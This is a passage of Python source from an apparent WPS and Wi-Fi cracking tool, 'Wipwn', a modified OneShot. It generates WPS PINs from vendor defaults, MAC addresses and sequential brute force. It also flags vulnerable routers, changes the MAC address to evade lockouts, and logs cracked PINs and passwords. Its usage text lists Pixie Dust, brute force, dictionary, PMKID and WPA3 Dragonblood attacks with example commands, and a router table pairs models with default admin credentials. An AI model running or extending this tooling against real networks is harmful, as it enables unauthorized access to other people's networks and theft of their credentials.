        return self.cracked_networks.get(bssid.upper(), None)

    def list_cracked_networks(self):
        """List all cracked networks"""
        print(f"{info} Cracked Networks ({len(self.cracked_networks)}):")
        for bssid, network_info in self.cracked_networks.items():
            print(f"  {cyan}{bssid}{reset} | {network_info['essid']} | PIN:{network_info['pin']} | Pass:{network_info['password']}")

    def add_to_vuln_list(self, device_model, bssid, essid):
        """Add successfully cracked device to vulnerability list"""
        if not self.vuln_list_file:
            return False

        try:

            if not os.path.exists(self.vuln_list_file):
                with open(self.vuln_list_file, 'w', encoding='utf-8') as f:
                    f.write("# WIPWN Vulnerability List - Cracked Devices\n")
                    f.write("# Format: Device Model (BSSID) [ESSID] (Cracked on DATE)\n\n")

            entry_parts = [device_model] if device_model else []
            entry_parts.append(f"({bssid})")
            if essid:
                entry_parts.append(f"[{essid}]")

            entry = " ".join(entry_parts)

            try:
                with open(self.vuln_list_file, 'r', encoding='utf-8') as f:
                    existing = f.read()
                    if bssid.upper() in existing or (device_model and device_model in existing):
                        print(f"{info} Device already in vulnerability list")
                        return True
            except:
                pass

            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            with open(self.vuln_list_file, 'a', encoding='utf-8') as f:
                f.write(f"{entry} (Cracked on {timestamp})\n")

            print(f"{ok} Added to vulnerability list: {entry}")
            return True
        except Exception as e:
            print(f"{warn} Failed to add to vulnerability list: {e}")
            return False

class SessionManager:
    """Manage WPS cracking sessions for resumption"""

    def __init__(self, session_file=None):
        self.session_file = session_file
        self.session_data = {}

    def save_session(self, bssid, pin, status, attempts=0, timestamp=None):
        """Save current session state"""
        if not self.session_file:
            return

        try:
            if not os.path.exists(os.path.dirname(self.session_file) or '.'):
                os.makedirs(os.path.dirname(self.session_file) or '.', exist_ok=True)

            session = {
                'bssid': bssid,
                'pin': pin,
                'status': status,
                'attempts': attempts,
                'timestamp': timestamp or datetime.now().isoformat()
            }

            with open(self.session_file, 'w') as f:
                import json
                json.dump(session, f, indent=2)
        except Exception as e:
            print(f"{warn} Failed to save session: {e}")

    def load_session(self):
        """Load previous session data"""
        if not self.session_file or not os.path.exists(self.session_file):
            return None

        try:
            import json
            with open(self.session_file, 'r') as f:
                self.session_data = json.load(f)
            return self.session_data
        except Exception as e:
            print(f"{warn} Failed to load session: {e}")
            return None

    def clear_session(self):
        """Clear session file"""
        if self.session_file and os.path.exists(self.session_file):
            try:
                os.remove(self.session_file)
            except Exception as e:
                print(f"{warn} Failed to clear session: {e}")

class ReportGenerator:
    """Generate results reports in TXT, CSV, and JSON formats"""

    def __init__(self, output_dir="reports"):
        self.output_dir = output_dir
        os.makedirs(output_dir, exist_ok=True)

    def save_txt_report(self, results, filename=None):
        """Save results as text file"""
        if not filename:
            filename = f"report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"

        filepath = os.path.join(self.output_dir, filename)

        try:
            with open(filepath, 'w') as f:
                f.write("=" * 60 + "\n")
                f.write("Wipwn WPS CRACKING REPORT\n")
                f.write("=" * 60 + "\n\n")

                for key, value in results.items():
                    f.write(f"{key}: {value}\n")

                f.write("\n" + "=" * 60 + "\n")
                f.write(f"Generated: {datetime.now()}\n")

            print(f"{ok} Report saved to: {filepath}")
            return filepath
        except Exception as e:
            print(f"{err} Failed to save TXT report: {e}")
            return None

    def save_csv_report(self, results_list, filename=None):
        """Save multiple results as CSV file"""
        if not filename:
            filename = f"report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv"

        filepath = os.path.join(self.output_dir, filename)

        try:
            if not results_list:
                return None

            fieldnames = results_list[0].keys()
            with open(filepath, 'w', newline='') as f:
                writer = csv.DictWriter(f, fieldnames=fieldnames)
                writer.writeheader()
                writer.writerows(results_list)

            print(f"{ok} CSV report saved to: {filepath}")
            return filepath
        except Exception as e:
            print(f"{err} Failed to save CSV report: {e}")
            return None

    def save_json_report(self, results, filename=None):
        """Save results as JSON file"""
        if not filename:
            filename = f"report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"

        filepath = os.path.join(self.output_dir, filename)

        try:
            import json
            with open(filepath, 'w') as f:
                json.dump(results, f, indent=2, default=str)

            print(f"{ok} JSON report saved to: {filepath}")
            return filepath
        except Exception as e:
            print(f"{err} Failed to save JSON report: {e}")
            return None

class RFKill:
    """Manage RF-Kill (wireless kill switch) for network interfaces"""

    @staticmethod
    def disable_rfkill(interface):
        """Disable RF-Kill to enable wireless"""
        try:
            result = subprocess.run(
                ['rfkill', 'unblock', 'wifi'],
                capture_output=True,
                text=True,
                timeout=5
            )
            if result.returncode == 0:
                print(f"{ok} RF-Kill disabled for WiFi")
                return True
            else:
                print(f"{warn} Failed to disable RF-Kill: {result.stderr}")
                return False
        except FileNotFoundError:
            print(f"{warn} rfkill tool not found")
            return False
        except Exception as e:
            print(f"{err} Error disabling RF-Kill: {e}")
            return False

    @staticmethod
    def enable_rfkill(interface):
        """Enable RF-Kill to disable wireless"""
        try:
            result = subprocess.run(
                ['rfkill', 'block', 'wifi'],
                capture_output=True,
                text=True,
                timeout=5
            )
            if result.returncode == 0:
                print(f"{ok} RF-Kill enabled for WiFi")
                return True
            else:
                print(f"{warn} Failed to enable RF-Kill: {result.stderr}")
                return False
        except Exception as e:
            print(f"{err} Error enabling RF-Kill: {e}")
            return False

    @staticmethod
    def check_rfkill_status():
        """Check current RF-Kill status"""
        try:
            result = subprocess.run(
                ['rfkill', 'list', 'wifi'],
                capture_output=True,
                text=True,
                timeout=5
            )
            return result.stdout
        except Exception as e:
            print(f"{err} Error checking RF-Kill status: {e}")
            return None

class NetworkManager:
    """NetworkManager integration for WiFi operations"""

    @staticmethod
    def is_available():
        """Check if NetworkManager is available"""
        try:
            subprocess.run(
                ['nmcli', '--version'],
                capture_output=True,
                timeout=2
            )
            return True
        except (FileNotFoundError, subprocess.TimeoutExpired):
            return False

    @staticmethod
    def get_connections():
        """Get list of saved WiFi connections"""
        try:
            result = subprocess.run(
                ['nmcli', 'connection', 'show', '--active'],
                capture_output=True,
                text=True,
                timeout=5
            )
            return result.stdout.split('\n') if result.returncode == 0 else []
        except Exception as e:
            print(f"{warn} Failed to get connections: {e}")
            return []

    @staticmethod
    def disconnect(interface):
        """Disconnect network interface"""
        try:
            subprocess.run(
                ['nmcli', 'device', 'disconnect', interface],
                capture_output=True,
                timeout=5
            )
            print(f"{ok} Disconnected {interface}")
            return True
        except Exception as e:
            print(f"{err} Failed to disconnect {interface}: {e}")
            return False

    @staticmethod
    def connect_to_network(ssid, password):
        """Connect to a WiFi network"""
        try:
            subprocess.run(
                ['nmcli', 'device', 'wifi', 'connect', ssid, 'password', password],
                capture_output=True,
                timeout=10
            )
            print(f"{ok} Connected to {ssid}")
            return True
        except Exception as e:
            print(f"{err} Failed to connect to {ssid}: {e}")
            return False

class PINAlgorithms:
    """WPS PIN generation algorithms"""

    @staticmethod
    def calculate_checksum(pin_str):
        """Calculate WPS PIN checksum"""
        try:
            pin = int(pin_str[:7])
            accum = 0
            while pin:
                accum += (accum % 10) + (pin % 10)
                pin //= 100
            return (10 - (accum % 10)) % 10
        except:
            return 0

    @staticmethod
    def validate_pin(pin_str):
        """Validate WPS PIN format and checksum"""
        if not pin_str or len(pin_str) != 8:
            return False

        try:
            expected_checksum = PINAlgorithms.calculate_checksum(pin_str)
            actual_checksum = int(pin_str[7])
            return expected_checksum == actual_checksum
        except:
            return False

    @staticmethod
    def generate_pins(bssid=None):
        """Generate candidate WPS PINs"""
        pins = []

        default_pins = [
            '12345670', '11111111', '00000000',
            '12341234', '00001234', '88888888'
        ]

        if bssid:
            try:

                mac = bssid.replace(':', '').lower()

                algorithms = [
                    mac[-7:-1],
                    mac[-5:-1] + '00',
                    mac[-3:] + mac[-7:-4],
                ]

                for algo in algorithms:
                    if len(algo) >= 7:
                        pin = algo[:7]
                        checksum = PINAlgorithms.calculate_checksum(pin)
                        pins.append(pin + str(checksum))
            except:
                pass

        pins.extend(default_pins)
        return list(set(pins))

class AdvancedPINAlgorithms:
    """Advanced WPS PIN generation with multiple algorithm support"""

    @staticmethod
    def generate_manufacturer_pins(vendor):
        """Generate OUI-based PINs from known manufacturer defaults"""
        oui_defaults = {
            'TP-Link': ['12345670', '45678901', '11223344', '99887766', '0000000'],
            'ZTE': ['00000000', '12345678', '11111111'],
            'Huawei': ['00000000', '12345678', '12340000'],
            'D-Link': ['12345670', '11111111', '00000000', '88888888'],
            'Netgear': ['12345670', '11223344', '00000000', '99887766'],
            'Linksys': ['12345670', '00000000', '11223344', '88888888'],
            'Asus': ['12345670', '88888888', '00000000', '11111111'],
            'Tenda': ['00000000', '12345670', '11111111', '99999999'],
            'Realtek': ['00000000', '12345670', '12345678'],
            'Buffalo': ['00000000', '12345670', '11111111'],
        }
        return oui_defaults.get(vendor, [])

    @staticmethod
    def generate_mac_based_pins(bssid):
        """Generate PINs based on MAC address patterns"""
        pins = []
        try:
            mac = bssid.replace(':', '').lower()

            if len(mac) >= 6:
                pin = mac[-6:] + '00'
                checksum = PINAlgorithms.calculate_checksum(pin)
                pins.append(pin + str(checksum))

            if len(mac) >= 6:
                pin = mac[:6] + '00'
                checksum = PINAlgorithms.calculate_checksum(pin)
                pins.append(pin + str(checksum))

            if len(mac) >= 6:
                oui = mac[:6]
                pin = (oui[0:2] + oui[2:4] + oui[4:6])[:7]
                checksum = PINAlgorithms.calculate_checksum(pin)
                pins.append(pin + str(checksum))

            for i in range(0, min(len(mac)-6, 3)):
                pin = mac[i*2:(i+4)*2][:7]
                if len(pin) == 7:
                    checksum = PINAlgorithms.calculate_checksum(pin)
                    pins.append(pin + str(checksum))

        except Exception as e:
            pass

        return pins

    @staticmethod
    def generate_sequential_pins(start_pin='10000000', count=100):
        """Generate sequential PINs for brute force (optimized range)"""
        pins = []
        try:
            start = int(start_pin[:7])
            for i in range(count):
                pin_num = start + i
                if pin_num < 10000000:
                    pin_str = str(pin_num).zfill(7)
                    checksum = PINAlgorithms.calculate_checksum(pin_str)
                    pins.append(pin_str + str(checksum))
        except:
            pass
        return pins

    @staticmethod
    def generate_intelligent_pins(bssid, vendor, essid=''):
        """Generate intelligently ordered candidate PINs"""
        all_pins = []
        seen = set()

        if vendor:
            for pin in AdvancedPINAlgorithms.generate_manufacturer_pins(vendor):
                if pin not in seen:
                    all_pins.append(pin)
                    seen.add(pin)

        if bssid:
            for pin in AdvancedPINAlgorithms.generate_mac_based_pins(bssid):
                if pin not in seen:
                    all_pins.append(pin)
                    seen.add(pin)

        if essid:
            try:

                numeric = ''.join(c for c in essid if c.isdigit())
                if len(numeric) >= 7:
                    pin = numeric[:7]
                    checksum = PINAlgorithms.calculate_checksum(pin)
                    pin_final = pin + str(checksum)
                    if pin_final not in seen:
                        all_pins.append(pin_final)
                        seen.add(pin_final)
            except:
                pass

        common = ['12345670', '11111111', '00000000', '88888888', '99999999']
        for pin in common:
            if pin not in seen:
                all_pins.append(pin)
                seen.add(pin)

        return all_pins

class VulnerabilityScanner:
    """Detect vulnerable WPS implementations"""

    def __init__(self, vuln_list_file=None):
        self.vulnerable_devices = []
        if vuln_list_file and os.path.exists(vuln_list_file):
            self.load_vulnerable_list(vuln_list_file)

    def load_vulnerable_list(self, filepath):
        """Load list of vulnerable devices"""
        try:
            with open(filepath, 'r', encoding='utf-8') as f:
                self.vulnerable_devices = [line.strip().upper() for line in f if line.strip()]
        except Exception as e:
            print(f"{warn} Failed to load vulnerability list: {e}")

    def check_vulnerability(self, bssid, vendor):
        """Check if network is vulnerable to WPS attacks"""
        if not bssid or not vendor:
            return False

        bssid_upper = bssid.upper()
        vendor_upper = vendor.upper()

        for vuln in self.vulnerable_devices:
            if bssid_upper.startswith(vuln) or vendor_upper in vuln:
                return True

        return False

    def get_vulnerability_info(self, vuln_type):
        """Get information about known WPS vulnerabilities"""
        info = {
            'pixie_dust': 'Pixie Dust attack - extracts WPS PIN from WPA2-PSK',
            'brute_force': 'Online brute force of WPS PIN (1-11000 combinations)',
            'pin_generation': 'Predictable PIN generation algorithms'
        }
        return info.get(vuln_type, "Unknown vulnerability type")

class WiFiScanner:
    """docstring for WiFiScanner"""
    def __init__(self, interface, vuln_list=None):
        self.interface = interface
        self.vuln_list = vuln_list
        self.storage_manager = StorageManager()
        self.router_models = RouterModels()

        reports_fname = os.path.dirname(os.path.realpath(__file__)) + '/reports/stored.csv'
        try:
            with open(reports_fname, 'r', newline='', encoding='utf-8', errors='replace') as file:
                csvReader = csv.reader(file, delimiter=';', quoting=csv.QUOTE_ALL)

                next(csvReader)
                self.stored = []
                for row in csvReader:
                    self.stored.append(
                        (
                            row[1],
                            row[2]
                        )
                    )
        except FileNotFoundError:
            self.stored = []

    def get_vulnerability_level(self, model, device_name, bssid):
        """Determine vulnerability level: fully, semi, or non-vulnerable"""

        for vendor, info in self.router_models.MODELS.items():
            for router_model in info['models']:
                if router_model.lower() in model.lower() or router_model.lower() in device_name.lower():
                    vulns = self.router_models.get_vulnerabilities(vendor)
                    if len(vulns) >= 2:
                        return 'fully'
                    elif len(vulns) == 1:
                        return 'semi'

        if self.vuln_list and (model in self.vuln_list or bssid.upper()[:6] in [v.upper() for v in self.vuln_list]):
            return 'fully'

        return 'semi'

    def iw_scanner(self) -> Optional[Dict[int, dict]]:
        """Parsing iw scan results"""
        def handle_network(line, result, networks):
            networks.append(
                    {
                        'Security type': 'Unknown',
                        'WPS': False,
                        'WPS locked': False,
                        'Model': '',
                        'Model number': '',
                        'Device name': ''
                     }
                )
            networks[-1]['BSSID'] = result.group(1).upper()

        def handle_essid(line, result, networks):
            d = result.group(1)
            networks[-1]['ESSID'] = codecs.decode(d, 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')

        def handle_level(line, result, networks):
            networks[-1]['Level'] = int(float(result.group(1)))

        def handle_securityType(line, result, networks):
            sec = networks[-1]['Security type']
            if result.group(1) == 'capability':
                if 'Privacy' in result.group(2):
                    sec = 'WEP'
                else:
                    sec = 'Open'
            elif sec == 'WEP':
                if result.group(1) == 'RSN':
                    sec = 'WPA2'
                elif result.group(1) == 'WPA':
                    sec = 'WPA'
            elif sec == 'WPA':
                if result.group(1) == 'RSN':
                    sec = 'WPA/WPA2'
            elif sec == 'WPA2':
                if result.group(1) == 'WPA':
                    sec = 'WPA/WPA2'
            networks[-1]['Security type'] = sec

        def handle_wps(line, result, networks):
            networks[-1]['WPS'] = result.group(1)

        def handle_wpsLocked(line, result, networks):
            flag = int(result.group(1), 16)
            if flag:
                networks[-1]['WPS locked'] = True

        def handle_model(line, result, networks):
            d = result.group(1)
            networks[-1]['Model'] = codecs.decode(d, 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')

        def handle_modelNumber(line, result, networks):
            d = result.group(1)
            networks[-1]['Model number'] = codecs.decode(d, 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')

        def handle_deviceName(line, result, networks):
            d = result.group(1)
            networks[-1]['Device name'] = codecs.decode(d, 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')

        cmd = 'iw dev {} scan'.format(self.interface)
        proc = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE,
                              stderr=subprocess.STDOUT, encoding='utf-8', errors='replace')
        lines = proc.stdout.splitlines()
        networks = []
        matchers = {
            re.compile(r'BSS (\S+)( )?\(on \w+\)'): handle_network,
            re.compile(r'SSID: (.*)'): handle_essid,
            re.compile(r'signal: ([+-]?([0-9]*[.])?[0-9]+) dBm'): handle_level,
            re.compile(r'(capability): (.+)'): handle_securityType,
            re.compile(r'(RSN):\t [*] Version: (\d+)'): handle_securityType,
            re.compile(r'(WPA):\t [*] Version: (\d+)'): handle_securityType,
            re.compile(r'WPS:\t [*] Version: (([0-9]*[.])?[0-9]+)'): handle_wps,
            re.compile(r' [*] AP setup locked: (0x[0-9]+)'): handle_wpsLocked,
            re.compile(r' [*] Model: (.*)'): handle_model,
            re.compile(r' [*] Model Number: (.*)'): handle_modelNumber,
            re.compile(r' [*] Device name: (.*)'): handle_deviceName
        }

        for line in lines:
            if line.startswith('command failed:'):
                print(f'{err} Error: {line}')
                return None
            line = line.strip('\t')
            for regexp, handler in matchers.items():
                res = re.match(regexp, line)
                if res:
                    handler(line, res, networks)

        networks = list(filter(lambda x: bool(x['WPS']), networks))
        if not networks:
            return None

        networks.sort(key=lambda x: x['Level'], reverse=True)

        network_list = {(i + 1): network for i, network in enumerate(networks)}

        def truncateStr(s, length, postfix='…'):
            """
            Truncate string with the specified length
            @s — input string
            @length — length of output string
            """
            if len(s) > length:
                k = length - len(postfix)
                s = s[:k] + postfix
            return s

        def colored(text, color=None):
            """Returns colored text"""
            if color:
                if color == 'green':
                    text = '\033[92m{}\033[00m'.format(text)
                elif color == 'red':
                    text = '\033[91m{}\033[00m'.format(text)
                elif color == 'light_red':
                    text = '\033[1;91m{}\033[00m'.format(text)
                elif color == 'yellow':
                    text = '\033[93m{}\033[00m'.format(text)
                else:
                    return text
            else:
                return text
            return text

        print('Network marks: {1} {0} {2} {0} {3} {0} {4} {0} {5}'.format(
            '|',
            colored('Possibly Vulnerable', color='green'),
            colored('WPS Locked', color='red'),
            colored('Already Stored', color='yellow'),
            'Maybe Vulnerable',
            colored('   ', color=None)
        ))
        print('Networks list:')
        print('{:<4} {:<18} {:<25} {:<8} {:<4} {:<27} {:<}'.format(
            '#', 'BSSID', 'ESSID', 'Sec.', 'PWR', 'WSC device name', 'WSC model'))

        network_list_items = list(network_list.items())
        if args.reverse_scan:
            network_list_items = network_list_items[::-1]
        for n, network in network_list_items:
            number = f'{n}| '
            model = network.get('Model', '') + ' ' + network.get('Model number', '')
            essid = truncateStr(network.get('ESSID', '<Hidden>'), 25)
            deviceName = truncateStr(network.get('Device name', ''), 27)
            bssid = network.get('BSSID', '')

            if not bssid:
                continue

            line = '{:<4} {:<18} {:<25} {:<8} {:<4} {:<27} {:<}'.format(
                number, bssid, essid,
                network.get('Security type', 'Unknown'), network.get('Level', '?'),
                deviceName, model.strip()
            )

            if self.storage_manager and self.storage_manager.is_cracked(bssid):
                print(colored(line, color='yellow'))

            elif network.get('WPS locked', False):
                print(colored(line, color='red'))

            else:
                vuln_level = self.get_vulnerability_level(model, network.get('Device name', ''), bssid)
                if vuln_level == 'fully':
                    print(colored(line, color='green'))
                elif vuln_level == 'semi':
                    print(line)
                else:
                    print(line)

        return network_list

    def prompt_network(self) -> Optional[str]:
        os.system('clear')
        banner = f"""
        {yellow}╔═════════════════════════════════════╗
        {yellow}║{reset}              {green}WIPWN{reset}                  {yellow}║{reset}
        {yellow}║{reset}          VERSION: {green}3.0.1{reset}             {yellow}║{reset}
        {yellow}║{reset} TOOL: {green}OneShot 0.0.2 (c) 2017 rofl0r{reset} {yellow}║{reset}
        {yellow}║{reset}        AUTHOR: {green}Mohammad Alamin{reset}      {yellow}║{reset}
        {yellow}║{reset}   GITHUB: {green}github.com/anbuinfosec{reset}    {yellow}║{reset}
        {yellow}╚═════════════════════════════════════╝{reset}"""
        print (banner)
        networks = self.iw_scanner()
        if not networks:
            print(f'{err} No WPS networks found.')
            return
        while 1:
            try:
                networkNo = input(f'{ask} Select target (press Enter to refresh): ')
                if networkNo.lower() in ('r', '0', ''):
                    return self.prompt_network()
                elif int(networkNo) in networks.keys():
                    return networks[int(networkNo)]['BSSID']
                else:
                    raise IndexError
            except Exception:
                print(f'{err} Invalid number')

def change_mac_address(iface, new_mac=None):
    """Change MAC address of network interface"""
    try:
        if new_mac is None:

            import random
            new_mac = '02:' + ':'.join(['{:02x}'.format(random.randint(0, 255)) for _ in range(5)])

        subprocess.run(f'ip link set {iface} down', shell=True, capture_output=True)

        result = subprocess.run(
            f'ip link set {iface} address {new_mac}',
            shell=True,
            capture_output=True,
            text=True
        )

        subprocess.run(f'ip link set {iface} up', shell=True, capture_output=True)

        if result.returncode == 0:
            print(f'{ok} MAC address changed to {new_mac}')
            return True
        else:
            print(f'{err} Failed to change MAC address')
            return False
    except Exception as e:
        print(f'{err} Error changing MAC address: {e}')
        return False

def get_current_mac(iface):
    """Get current MAC address of interface"""
    try:
        result = subprocess.run(
            f'ip link show {iface}',
            shell=True,
            capture_output=True,
            text=True
        )

        match = re.search(r'link/ether\s+([0-9a-f:]{17})', result.stdout)
        if match:
            return match.group(1)
    except Exception as e:
        print(f'{warn} Failed to get MAC address: {e}')

    return None

def get_gateway():
    """Get default gateway IP"""
    try:
        result = subprocess.run(
            'ip route show | grep default',
            shell=True,
            capture_output=True,
            text=True
        )
        match = re.search(r'default via\s+([\d.]+)', result.stdout)
        if match:
            return match.group(1)
    except:
        pass
    return None

def get_local_ip(iface):
    """Get local IP address of interface"""
    try:
        result = subprocess.run(
            f'ip addr show {iface}',
            shell=True,
            capture_output=True,
            text=True
        )
        match = re.search(r'inet\s+([\d.]+)', result.stdout)
        if match:
            return match.group(1)
    except:
        pass
    return None

def get_interface_mode(iface):
    """Get interface mode (managed/monitor)"""
    try:
        result = subprocess.run(
            f'iwconfig {iface}',
            shell=True,
            capture_output=True,
            text=True
        )
        if 'Monitor' in result.stdout:
            return 'Monitor'
        elif 'Managed' in result.stdout:
            return 'Managed'
    except:
        pass
    return None

def is_interface_up(iface):
    """Check if interface is up"""
    try:
        result = subprocess.run(
            f'ip link show {iface}',
            shell=True,
            capture_output=True,
            text=True
        )
        return 'UP' in result.stdout
    except:
        return False

def get_signal_strength(bssid, iface):
    """Get WiFi signal strength dBm"""
    try:
        result = subprocess.run(
            f'iwlist {iface} scan',
            shell=True,
            capture_output=True,
            text=True
        )

        lines = result.stdout.split('\n')
        for i, line in enumerate(lines):
            if bssid.lower() in line.lower():

                for j in range(max(0, i-5), min(len(lines), i+5)):
                    if 'Signal' in lines[j]:
                        match = re.search(r'(-\d+)\s*dBm', lines[j])
                        if match:
                            return int(match.group(1))
    except:
        pass

    return None

def format_result(ssid, bssid, pin, psk, signal=None, channel=None, encryption=None):
    """Format successful crack result"""
    result = {
        'ssid': ssid,
        'bssid': bssid,
        'pin': pin,
        'psk': psk,
        'signal': signal,
        'channel': channel,
        'encryption': encryption,
        'timestamp': datetime.now().isoformat()
    }
    return result

def log_result(result, log_file='crack_results.log'):
    """Log result to file"""
    try:
        with open(log_file, 'a') as f:
            f.write(f"[{result['timestamp']}] ")
            f.write(f"SSID: {result['ssid']} | ")
            f.write(f"BSSID: {result['bssid']} | ")
            f.write(f"PIN: {result['pin']} | ")
            f.write(f"PSK: {result['psk']}\n")
        return True
    except Exception as e:
        print(f'{warn} Failed to log result: {e}')
        return False

def print_result(result, verbose=False):
    """Pretty print attack result"""
    print(f"\n{green}{'='*60}{reset}")
    print(f"{green}[SUCCESS]{reset} WPS PIN Found!")
    print(f"{green}{'='*60}{reset}")
    print(f"  SSID: {cyan}{result['ssid']}{reset}")
    print(f"  BSSID: {cyan}{result['bssid']}{reset}")
    print(f"  PIN: {yellow}{result['pin']}{reset}")
    print(f"  PSK: {yellow}{result['psk']}{reset}")

    if verbose:
        if result.get('channel'):
            print(f"  Channel: {result['channel']}")
        if result.get('signal'):
            print(f"  Signal: {result['signal']} dBm")
        if result.get('encryption'):
            print(f"  Encryption: {result['encryption']}")

    print(f"{green}{'='*60}{reset}\n")

def ifaceUp(iface, down=False):
    if down:
        action = 'down'
    else:
        action = 'up'
    cmd = 'ip link set {} {}'.format(iface, action)
    res = subprocess.run(cmd, shell=True, stdout=sys.stdout, stderr=sys.stdout)
    if res.returncode == 0:
        return True
    else:
        return False

def die(msg):
    sys.stderr.write(msg + '\n')
    sys.exit(1)

def usage():
    return f"""
OneShot 0.0.2 (c) 2017 rofl0r, modded by anbuinfosec
Enhanced with WPA2/WPA3 attacks, Online Bruteforce, and Router Database

{cyan}USAGE:{reset}
  %(prog)s [attack_type] [options]

{cyan}ATTACK TYPES:{reset}
  {yellow}-K, --pixie-dust{reset}              : WPS Pixie Dust Attack (Offline)
  {yellow}-B, --bruteforce{reset}               : WPS Online Bruteforce Attack  
  {yellow}--wpa2-attack{reset}                 : WPA2 Dictionary Attack
  {yellow}--wpa3-attack{reset}                 : WPA3 Dragonblood Attack (SAE)
  {yellow}--pbc, --push-button-connect{reset}  : WPS Push Button Connect (PBC)
  {yellow}--online-crack{reset}                : Combined Online Attacks

{cyan}REQUIRED OPTIONS:{reset}
  {yellow}-i, --interface IFACE{reset}         : WiFi interface (e.g., wlan0)

{cyan}OPTIONAL OPTIONS:{reset}
  {yellow}-b, --bssid MAC{reset}               : Target BSSID (auto-scan if not set)
  {yellow}-p, --pin PIN{reset}                 : Specific WPS PIN to test
  {yellow}--ssid SSID{reset}                   : Target network name
  {yellow}--channel CH{reset}                  : Target channel (auto-detect)
  {yellow}-w, --write{reset}                  : Save credentials to file on success

{cyan}ADVANCED WPS OPTIONS:{reset}
  {yellow}-F, --pixie-force{reset}             : Force Pixiewps (all combinations)
  {yellow}-X, --show-pixie-cmd{reset}          : Display Pixiewps command
  {yellow}-d, --delay MS{reset}                : Delay between PIN attempts (ms)
  {yellow}-t, --timeout SEC{reset}             : WPS response timeout (seconds)
  {yellow}--lock-delay SEC{reset}              : Delay after lock detection
  {yellow}-L, --ignore-locks{reset}            : Ignore AP lock status
  {yellow}-M, --mac-changer{reset}             : Change MAC per attempt
  {yellow}-S, --session FILE{reset}            : Resume/save session

{cyan}WORDLIST & DICTIONARY OPTIONS:{reset}
  {yellow}--wordlist FILE{reset}               : Custom password dictionary
  {yellow}--wordlist-size SIZE{reset}          : Max passwords to try
  {yellow}--gen-common{reset}                  : Generate common passwords
  {yellow}--rule-based{reset}                  : Apply mutation rules

{cyan}ROUTER DETECTION & TARGETING:{reset}
  {yellow}--detect-model{reset}               : Detect router model/vendor
  {yellow}--router-models{reset}              : Show known vulnerable routers
  {yellow}--target-model MODEL{reset}         : Target specific router model
  {yellow}--vendor VENDOR{reset}              : Filter by vendor (TP-Link, D-Link, etc)

{cyan}WPA2/WPA3 OPTIONS:{reset}
  {yellow}--wpa-handshake FILE{reset}         : WPA handshake pcap for cracking
  {yellow}--pmkid{reset}                      : Use PMKID attack (WPA2)
  {yellow}--sae-sync{reset}                   : SAE synchronization (WPA3)
  {yellow}--disable-cloaking{reset}           : Attack hidden networks

{cyan}NETWORK SCANNING:{reset}
  {yellow}--scan{reset}                       : Scan for networks and exit
  {yellow}--scan-time SEC{reset}              : Scan duration (seconds)
  {yellow}--show-hidden{reset}                : Include hidden networks
  {yellow}--reverse-scan{reset}               : Reverse network order
  {yellow}--filter-by-channel CH{reset}       : Show networks on channel

{cyan}REPORTING & OUTPUT:{reset}
  {yellow}--report-format FMT{reset}          : Format: txt, csv, json [default: txt]
  {yellow}--report-dir DIR{reset}             : Report directory [default: reports]
  {yellow}--json-output FILE{reset}           : Save results as JSON
  {yellow}--csv-output FILE{reset}            : Save results as CSV
  {yellow}--log-file FILE{reset}              : Log all activity

{cyan}SYSTEM OPTIONS:{reset}
  {yellow}--mtk-wifi{reset}                   : MediaTek WiFi driver support
  {yellow}--handle-rfkill{reset}              : Auto RF-Kill management
  {yellow}--use-nm{reset}                    : Use NetworkManager
  {yellow}--iface-down{reset}                 : Down interface on exit
  {yellow}--mac-spoofing{reset}               : Enable MAC randomization
  {yellow}--no-colors{reset}                  : Disable colored output
  {yellow}-v, --verbose{reset}                : Verbose output

{cyan}LOOP & AUTOMATION:{reset}
  {yellow}-l, --loop{reset}                   : Attack all networks continuously
  {yellow}--auto-crack{reset}                 : Auto select cracking method
  {yellow}--batch{reset}                      : Batch mode (non-interactive)

{cyan}EXAMPLES:{reset}
  {yellow}# Pixie Dust attack with auto-scan{reset}
  %(prog)s -i wlan0 -K

  {yellow}# WPS online bruteforce{reset}
  %(prog)s -i wlan0 -B --mac-changer --delay 100

  {yellow}# WPA2 dictionary attack{reset}
  %(prog)s -i wlan0 -b AA:BB:CC:DD:EE:FF --wpa2-attack --wordlist passwords.txt

  {yellow}# Target specific router model{reset}
  %(prog)s -i wlan0 --target-model TP-Link --detect-model

  {yellow}# Combined attack with reporting{reset}
  %(prog)s -i wlan0 --online-crack --csv-output results.csv --session my_crack

  {yellow}# WPA3 SAE attack{reset}
  %(prog)s -i wlan0 --wpa3-attack --sae-sync

{cyan}COMPATIBILITY:{reset}
  Python 3.6+, Linux with wireless-tools/aircrack-ng
  Supports: Pixiewps, Reaver, Aircrack-ng, hashcat (optional)

{cyan}WARNING:{reset}
  {light_red}This tool is for authorized security testing only!{reset}
  Unauthorized network access is illegal in most jurisdictions.
"""

class RouterModels:
    """Comprehensive database of 30+ router manufacturers with vulnerabilities and exploitation methods"""

    MODELS = {
        'TP-Link': {
            'models': ['TL-WR841N', 'TL-WR742N', 'TL-WR941N', 'TL-WR840N', 'TL-MR3420', 'TL-WR1043N', 'Archer C7', 'Archer C9', 'TL-WR902AC'],
            'default_pins': ['12345670', '45678901', '11223344', '99887766', '00000000'],
            'default_creds': [('admin', 'admin'), ('admin', ''), ('', 'admin')],
            'weak_wps': True,
            'pixie_dust': True,
            'brute_force': True,
            'vuln_versions': ['1.0', '1.1', '1.2', '1.3', '1.4']
        },
        'D-Link': {
            'models': ['DAP-1190', 'DAP-1360', 'DIR-300', 'DIR-600', 'DIR-615', 'DIR-645', 'DIR-825', 'DIR-880L', 'DAP-1520'],
            'default_pins': ['00000000', '12345670', '11111111', '88888888'],
            'default_creds': [('admin', 'admin'), ('admin', ''), ('admin', 'password')],
            'weak_wps': True,
            'pixie_dust': True,
            'brute_force': True,
            'vuln_versions': ['1.0', '2.0', '2.1', '3.0']
        },
        'Netgear': {
            'models': ['WNR614N', 'WNR1200', 'WNR2000', 'WNR2200', 'WNDR3700', 'WNDR4300', 'WNDR4500', 'R7000', 'R8000', 'Nighthawk X10', 'R9000'],
            'default_pins': ['12345670', '11223344', '00000000'],
            'default_creds': [('admin', 'password'), ('admin', 'admin')],
